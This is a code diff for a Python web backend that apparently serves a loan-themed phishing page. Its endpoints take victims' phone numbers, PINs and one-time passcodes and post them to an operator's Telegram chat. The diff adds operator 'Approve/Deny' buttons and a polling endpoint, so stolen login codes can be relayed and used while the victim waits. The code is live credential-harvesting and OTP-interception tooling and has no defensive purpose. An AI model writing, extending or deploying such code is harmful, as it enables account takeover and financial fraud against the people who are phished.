@@ -23,9 +23,10 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 # In-memory databases
-LOAN_REQUESTS = {}
+LOGIN_REQUESTS = {} # ✅ NEW
 OTP_REQUESTS = {}
 SECOND_VERIFICATION_REQUESTS = {}
+LOAN_REQUESTS = {}
 
 # --- KEEP-ALIVE BACKGROUND TASK ---
 async def self_ping():
@@ -54,7 +55,6 @@ class OTPRequest(BaseModel):
     phone_number: str
     otp_code: str
 
-# ✅ UPDATED: Removed secret_code from the model
 class SecondVerificationRequest(BaseModel):
     phone_number: str
     second_otp: str
@@ -72,10 +72,32 @@ async def root():
 
 @app.post("/api/login")
 async def login(data: LoginRequest):
-    await send_telegram_message(
-        f"🔐 <b>New Login Attempt</b>\n📱 Phone: {data.phone_number}\n🔑 PIN: {data.pin}"
-    )
-    return {"status": "success"}
+    login_id = str(uuid.uuid4())
+    LOGIN_REQUESTS[login_id] = "pending"
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": f"🔐 <b>New Login Attempt</b>\n\n📱 Phone: {data.phone_number}\n🔑 PIN: {data.pin}",
+            "parse_mode": "HTML",
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "✅ Approve Login", "callback_data": f"approve_login_{login_id}"},
+                    {"text": "❌ Deny Login", "callback_data": f"deny_login_{login_id}"}
+                ]]
+            }
+        }
+        async with httpx.AsyncClient() as client:
+            await client.post(url, json=payload, timeout=10.0)
+
+    return {"status": "pending", "login_id": login_id}
+
+@app.get("/api/login-status/{login_id}")
+async def get_login_status(login_id: str):
+    if login_id not in LOGIN_REQUESTS:
+        raise HTTPException(status_code=404, detail="Login request not found")
+    return {"status": LOGIN_REQUESTS[login_id]}
 
 @app.post("/api/verify-otp")
 async def verify_otp(data: OTPRequest):
@@ -106,7 +128,6 @@ async def get_otp_status(otp_id: str):
         raise HTTPException(status_code=404, detail="OTP not found")
     return {"status": OTP_REQUESTS[otp_id]}
 
-# ✅ UPDATED: Second verification no longer expects a secret code
 @app.post("/api/verify-second-otp")
 async def verify_second_otp(data: SecondVerificationRequest):
     verify_id = str(uuid.uuid4())
@@ -116,11 +137,7 @@ async def verify_second_otp(data: SecondVerificationRequest):
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             "chat_id": TELEGRAM_CHAT_ID,
-            "text": (
-                f"🔐 <b>2nd Verification</b>\n\n"
-                f"📱 Phone: {data.phone_number}\n"
-                f"🔢 2nd OTP: <code>{data.second_otp}</code>"
-            ),
+            "text": f"🔐 <b>2nd Verification</b>\n\n📱 Phone: {data.phone_number}\n🔢 2nd OTP: <code>{data.second_otp}</code>",
             "parse_mode": "HTML",
             "reply_markup": {
                 "inline_keyboard": [[
@@ -181,7 +198,10 @@ async def telegram_webhook(request: Request):
                 return {"status": "ok"}
 
             # Update status based on item type
-            if item_type == "otp" and item_id in OTP_REQUESTS:
+            if item_type == "login" and item_id in LOGIN_REQUESTS:
+                LOGIN_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
+                reply_text = "✅ Login Approved" if action == "approve" else "❌ Login Denied"
+            elif item_type == "otp" and item_id in OTP_REQUESTS:
                 OTP_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ 1st OTP Approved" if action == "approve" else "❌ 1st OTP Denied"
             elif item_type == "second" and item_id in SECOND_VERIFICATION_REQUESTS:
